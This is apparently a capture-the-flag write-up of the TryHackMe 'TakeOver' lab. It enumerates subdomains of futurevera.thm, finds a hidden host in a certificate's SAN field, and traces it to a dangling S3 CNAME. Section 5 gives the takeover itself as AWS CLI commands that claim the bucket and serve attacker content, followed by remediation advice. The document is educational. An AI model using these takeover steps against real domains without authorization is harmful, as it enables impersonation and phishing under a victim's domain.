# TryHackMe — TakeOver: Subdomain Enumeration & AWS S3 Bucket Takeover

**Author:** Kyle Tawa  
**Platform:** TryHackMe  
**Room:** [TakeOver](https://tryhackme.com/room/takeover)  
**Difficulty:** Easy  
**Category:** Web / Cloud Security — Subdomain Takeover  
**Target Domain:** `futurevera.thm`  
**Date Completed:** June 2026

---

## Executive Summary

The **TakeOver** room on TryHackMe simulates a realistic subdomain takeover scenario. The target organization, *FutureVera*, has left a dangling DNS CNAME record pointing to a deprovisioned Amazon S3 bucket. Through a combination of subdomain enumeration, SSL certificate analysis, and cloud resource identification, an attacker can discover the orphaned subdomain and — in a real-world scenario — register the unclaimed S3 bucket to achieve full subdomain takeover. Within this lab environment, the flag is leaked directly via the S3 bucket name in an HTTP redirect error message.

This write-up documents the full methodology used to compromise the target, including multiple subdomain enumeration techniques, certificate inspection, and exploitation of the dangling cloud resource.

---

## Table of Contents

1. [Scenario Background](#1-scenario-background)
2. [Reconnaissance & Enumeration](#2-reconnaissance--enumeration)
   - 2.1 Network Scanning with Nmap
   - 2.2 Subdomain Enumeration with ffuf / gobuster dns
   - 2.3 Passive Enumeration with Subfinder
   - 2.4 DNS Record Analysis with DNSRecon
3. [Subdomain Discovery via SSL Certificate Inspection](#3-subdomain-discovery-via-ssl-certificate-inspection)
4. [Vulnerability Identification — Dangling S3 Bucket](#4-vulnerability-identification--dangling-s3-bucket)
5. [Exploitation — Subdomain Takeover](#5-exploitation--subdomain-takeover)
6. [Flag Capture](#6-flag-capture)
7. [Remediation Recommendations](#7-remediation-recommendations)
8. [Appendix — Tool Commands & Outputs](#8-appendix--tool-commands--outputs)

---

## 1. Scenario Background

The room presents the following scenario:

> *"I am the CEO and one of the co-founders of futurevera.thm. In Futurevera, we believe that the future is in space. We do a lot of space research and write blogs about it. We used to help students with space questions, but we are rebuilding our support. Recently blackhat hackers approached us saying they could takeover and are asking us for a big ransom."*

The application is hosted at `https://futurevera.thm`. The narrative strongly hints at two potential subdomains: **support** (rebuilding support) and **blog** (space research blogs). This provides an initial foothold for enumeration.

### Setup

Add the target machine IP to `/etc/hosts`:

```bash
sudo sh -c 'echo "<MACHINE_IP>  futurevera.thm" >> /etc/hosts'
```

Verify connectivity:

```bash
ping -c 2 futurevera.thm
```

---

## 2. Reconnaissance & Enumeration

### 2.1 Network Scanning with Nmap

A comprehensive port scan reveals the attack surface:

```bash
nmap -sC -sV -sS -T4 -Pn futurevera.thm -oN nmap_initial.txt
```

**Results:**

| Port | State | Service | Version / Notes |
|------|-------|---------|-----------------|
| 22/tcp | open | SSH | OpenSSH 8.2p1 Ubuntu |
| 80/tcp | open | HTTP | Apache 2.4.41 — redirects to HTTPS |
| 443/tcp | open | HTTPS | Apache 2.4.41 — main web application |

The HTTP service on port 80 immediately redirects to HTTPS. No extraneous services are exposed, confirming the attack surface is purely web-based. The SSL certificate on port 443 uses the common name `futurevera.thm`.

### 2.2 Subdomain Enumeration with ffuf / gobuster dns

With no useful directories discovered via standard directory brute-force (`gobuster dir`), the focus shifts to subdomain enumeration. Because the web server uses virtual hosting (multiple sites sharing the same IP), we must fuzz the `Host` header rather than relying on public DNS records.

#### Method A: Virtual Host Fuzzing with ffuf

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -H "Host: FUZZ.futurevera.thm" \
     -u https://<MACHINE_IP> \
     -fs 4605 -c -t 100
```

**Flags explained:**
- `-w`: Wordlist path (SecLists DNS subdomains)
- `-H "Host: FUZZ.futurevera.thm"`: Fuzz the Host header positionally
- `-u`: Target URL (using IP to bypass DNS)
- `-fs 4605`: Filter out responses with size 4605 bytes (the default error page)
- `-c`: Colorize output
- `-t 100`: Increase thread count for speed

**Discovered subdomains:**

| Subdomain | Response Size | Notes |
|-----------|--------------|-------|
| `support.futurevera.thm` | 1,522 bytes | Live — under renovation |
| `blog.futurevera.thm` | 3,838 bytes | Live — blogs about space |

#### Method B: DNS Brute-Force with gobuster dns

An alternative approach using gobuster's DNS mode:

```bash
gobuster dns -d futurevera.thm \
             -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
             -i -o gobuster_dns.txt
```

The `-i` flag shows resolved IP addresses, confirming which subdomains have DNS A records.

Update `/etc/hosts` with the discovered subdomains:

```bash
sudo sh -c 'echo "<MACHINE_IP>  futurevera.thm blog.futurevera.thm support.futurevera.thm" >> /etc/hosts'
```

### 2.3 Passive Enumeration with Subfinder

Subfinder performs passive subdomain enumeration by querying multiple public sources (Certificate Transparency logs, DNS dumpsters, search engines, etc.) without making any direct requests to the target:

```bash
subfinder -d futurevera.thm -o subfinder_output.txt
```

Subfinder leverages sources such as:
- **Certificate Transparency** (crt.sh, CertSpotter, Google)
- **DNS** (RapidDNS, DNSDB)
- **Web** (AlienVault OTX, Wayback Machine, ThreatMiner)

> **Note:** In a real-world engagement, Subfinder is often the first tool run because it is passive, fast, and non-invasive. It would complement active techniques like ffuf and gobuster.

### 2.4 DNS Record Analysis with DNSRecon

DNSRecon performs comprehensive DNS record enumeration, including detection of CNAME records that may point to external cloud services:

```bash
dnsrecon -d futurevera.thm -t std -o dnsrecon_std.txt
```

The `-t std` flag runs standard enumeration (NS, SOA, MX, A, AAAA, CNAME, TXT). A more targeted CNAME scan can be run:

```bash
dnsrecon -d futurevera.thm -t crt -o dnsrecon_crt.txt
```

The `-t crt` flag queries Certificate Transparency logs, often revealing subdomains that are not publicly resolvable but have had SSL certificates issued for them.

### Reconnaissance Summary

| Tool | Type | Subdomains Found |
|------|------|-----------------|
| ffuf (vhost) | Active (Host header fuzzing) | `support`, `blog` |
| gobuster dns | Active (DNS brute-force) | `support`, `blog` |
| Subfinder | Passive (public sources) | Supplementary |
| DNSRecon | Passive/Active (DNS queries + CT logs) | Supplementary |

---

## 3. Subdomain Discovery via SSL Certificate Inspection

The `support.futurevera.thm` subdomain presented a static page with no interesting content or directories. However, manual inspection of its SSL certificate yielded the critical breakthrough.

### Certificate Inspection with OpenSSL

```bash
echo | openssl s_client -connect support.futurevera.thm:443 \
    -servername support.futurevera.thm 2>/dev/null | \
    openssl x509 -noout -text
```

### Browser-Based Inspection (Alternative)

1. Navigate to `https://support.futurevera.thm`
2. Click the padlock icon → **Connection is secure**
3. Click **Certificate is valid** (or **Show certificate**)
4. Navigate to the **Details** tab
5. Scroll to **Subject Alternative Name (SAN)**

### Critical Finding

The certificate's **Subject Alternative Name (SAN)** field contained an unexpected entry:

```
X509v3 Subject Alternative Name:
    DNS:futurevera.thm
    DNS:secrethelpdesk934752.support.futurevera.thm
```

This reveals a hidden fourth-level subdomain: **`secrethelpdesk934752.support.futurevera.thm`** — a secret help desk portal that the developers attempted to obscure but exposed through the SSL certificate.

> **Key Insight:** SSL/TLS certificates are public documents. Any domain name listed in the SAN or CN fields is publicly visible in Certificate Transparency logs (crt.sh, Google CT). This is a passive reconnaissance goldmine.

Update `/etc/hosts` to include the newly discovered subdomain:

```bash
sudo sh -c 'echo "<MACHINE_IP>  secrethelpdesk934752.support.futurevera.thm" >> /etc/hosts'
```

---

## 4. Vulnerability Identification — Dangling S3 Bucket

With the hidden subdomain added to our hosts file, we attempt to access it:

### Initial Access Attempt

```bash
curl -I http://secrethelpdesk934752.support.futurevera.thm
```

**Response:**

```
HTTP/1.1 302 Found
Date: ...
Location: http://flag{*********************************}.s3-website-us-west-3.amazonaws.com/
```

The server returns an HTTP 302 redirect pointing to an AWS S3 bucket URL. The CNAME record for this subdomain was configured to point to an S3 bucket static website endpoint — but the bucket has been **deleted**.

### Confirming the Vulnerability

Visiting the URL in a browser yields an error confirming the bucket is unclaimed:

> **Hmm. We're having trouble finding that site.**
> We can't connect to the server at **`flag{*********************************}.s3-website-us-west-3.amazonaws.com`**.

### Root Cause Analysis

The DNS chain for this subdomain looks like this:

```
secrethelpdesk934752.support.futurevera.thm
  └── CNAME ──→ flag{...}.s3-website-us-west-3.amazonaws.com
                      └── AWS S3 bucket ──→ DELETED / UNCLAIMED
```

The organization previously hosted static content (likely a help desk portal) on AWS S3. When they decommissioned the bucket, they **did not remove the CNAME record** from their DNS configuration. This creates a **dangling DNS entry** — a prime candidate for subdomain takeover.

---

## 5. Exploitation — Subdomain Takeover

In a real-world scenario, the full exploitation chain proceeds as follows:

### Step 5.1: Verify Dangling CNAME

First, confirm that no active service is listening on the S3 endpoint:

```bash
dig CNAME secrethelpdesk934752.support.futurevera.thm

# Expected output shows CNAME pointing to AWS S3
```

```bash
curl -I http://flag{*********************************}.s3-website-us-west-3.amazonaws.com

# Expected: 404 NoSuchBucket — confirms the bucket is unclaimed
```

### Step 5.2: Register the Unclaimed Bucket

The AWS S3 bucket name is extracted from the CNAME or redirect URL. In this lab, the bucket name itself contains the flag (`flag{...}`), but in a real engagement, the attacker would:

1. **Create an AWS account** (if not already owned)
2. **Register the S3 bucket** with the exact same name using the AWS CLI or Console:

```bash
aws s3api create-bucket \
    --bucket flag{*********************************} \
    --region us-west-3 \
    --create-bucket-configuration LocationConstraint=us-west-3
```

3. **Enable static website hosting** on the bucket:

```bash
aws s3 website s3://flag{*********************************} \
    --index-document index.html \
    --error-document error.html
```

4. **Upload malicious content** to the bucket:

```bash
echo '<h1>Subdomain Takeover Successful</h1>
<p>This subdomain is now under attacker control.</p>' > index.html

aws s3 cp index.html s3://flag{*********************************}/
```

5. **Apply a bucket policy** allowing public read access:

```bash
aws s3api put-bucket-policy \
    --bucket flag{*********************************} \
    --policy '{
        "Version": "2012-10-17",
        "Statement": [{
            "Sid": "PublicReadGetObject",
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::flag{*********************************}/*"
        }]
    }'
```

### Step 5.3: Verification

Once the bucket is registered and hosting is enabled, visiting `http://secrethelpdesk934752.support.futurevera.thm` now serves the attacker-controlled content under the legitimate `futurevera.thm` domain — **full subdomain takeover achieved**.

---

## 6. Flag Capture

Within the lab environment, the flag is obtained directly from the S3 bucket name exposed in the HTTP redirect or browser error message.

**Flag value:** `flag{*********************************}`

The flag is obtained by following the HTTP 302 redirect from `http://secrethelpdesk934752.support.futurevera.thm` and reading the target bucket name.

---

## 7. Remediation Recommendations

To prevent subdomain takeover vulnerabilities, organizations should implement the following measures:

### 7.1 DNS Hygiene

- **Audit DNS records regularly:** Identify and remove any CNAME or A records pointing to deprovisioned services.
- **Implement a DNS change management process:** Require approval and verification before removing cloud resources, ensuring DNS entries are cleaned up simultaneously.
- **Use a monitoring tool** (e.g., DNSReaper, Sublist3r) to continuously scan for dangling DNS entries.

### 7.2 Cloud Resource Management

- **Delete in a specific order:** When decommissioning cloud resources, always delete the resource **after** removing the DNS record that points to it — never before.
- **Use Azure Service Tags / AWS Resource Groups** to tag resources with their associated DNS entries, making cleanup systematic.

### 7.3 Certificate Management

- **Avoid placing hidden subdomains in SAN fields** if they are meant to be secret — SSL certificates are public.
- **Use wildcard certificates** (`*.futurevera.thm`) for internal services to avoid leaking subdomain names in CT logs.
- **Monitor Certificate Transparency logs** (e.g., crt.sh) for unauthorized certificate issuances that may reveal hidden subdomains.

### 7.4 Subdomain Takeover Prevention

- **Claim the bucket immediately** if a CNAME points to an unclaimed cloud resource — before an attacker does.
- **Use Azure DNS `alias` records** (Azure) or **Route53 alias records** (AWS) which are validated against the service endpoint and will fail to resolve if the resource doesn't exist.
- **Implement CSP and CORS policies** to limit the impact if a subdomain is compromised.

---

## 8. Appendix — Tool Commands & Outputs

### A. Full Nmap Scan

```bash
nmap -p- -sC -sV -sS -T4 -Pn futurevera.thm -oN nmap_full.txt
```

### B. ffuf Virtual Host Fuzzing

```bash
# Initial scan without filtering
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -H "Host: FUZZ.futurevera.thm" \
     -u https://<MACHINE_IP> \
     -c -t 100

# Refined scan with size filtering
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -H "Host: FUZZ.futurevera.thm" \
     -u https://<MACHINE_IP> \
     -fs 4605 -c -t 100
```

### C. gobuster DNS Mode

```bash
gobuster dns -d futurevera.thm \
             -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
             -i -r <DNS_SERVER_IP> -o gobuster_dns.txt
```

### D. Subfinder (Passive Enumeration)

```bash
subfinder -d futurevera.thm -all -o subfinder_results.txt
```

The `-all` flag enables all passive sources for maximum coverage.

### E. DNSRecon (DNS Record Analysis)

```bash
# Standard enumeration
dnsrecon -d futurevera.thm -t std -o dnsrecon_std.txt

# Certificate Transparency log query
dnsrecon -d futurevera.thm -t crt -o dnsrecon_crt.txt

# Brute-force subdomain enumeration
dnsrecon -d futurevera.thm -t brt \
         -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
         -o dnsrecon_brt.txt
```

### F. SSL Certificate Inspection

```bash
# Via OpenSSL
echo | openssl s_client -connect support.futurevera.thm:443 \
    -servername support.futurevera.thm 2>/dev/null | \
    openssl x509 -noout -text | grep -A 2 "Subject Alternative Name"

# Via nmap ssl-cert script
nmap -p 443 --script ssl-cert support.futurevera.thm
```

### G. CNAME Resolution Check

```bash
# Query the specific subdomain's CNAME
nslookup -type=CNAME secrethelpdesk934752.support.futurevera.thm

# Or with dig
dig CNAME secrethelpdesk934752.support.futurevera.thm +short
```

### H. Full Hosts File Entry

```
<MACHINE_IP>  futurevera.thm blog.futurevera.thm support.futurevera.thm secrethelpdesk934752.support.futurevera.thm
```

---

## Key Takeaways

1. **Subdomain enumeration is multi-faceted.** A combination of active (ffuf, gobuster dns) and passive (Subfinder, crt.sh) techniques provides the best coverage. No single tool catches everything.

2. **SSL certificates leak subdomains.** The Subject Alternative Name (SAN) field is a rich, often-overlooked source of hidden subdomains. Always inspect SSL certificates manually or via CT logs.

3. **Dangling DNS records are a critical vulnerability.** A CNAME pointing to a deprovisioned cloud resource (S3 bucket, Azure Web App, GitHub Pages, etc.) enables subdomain takeover — which can lead to phishing, session hijacking, or malware distribution under a trusted domain.

4. **Defense in depth applies to DNS too.** Remove DNS records before decommissioning resources, monitor CT logs, and regularly audit your external DNS posture.

---

*Room created by Fumenoid, reviewed by John Hammond, cmnatic, and timtaylor.*  
*Write-up by Kyle Tawa — published for portfolio and educational purposes.*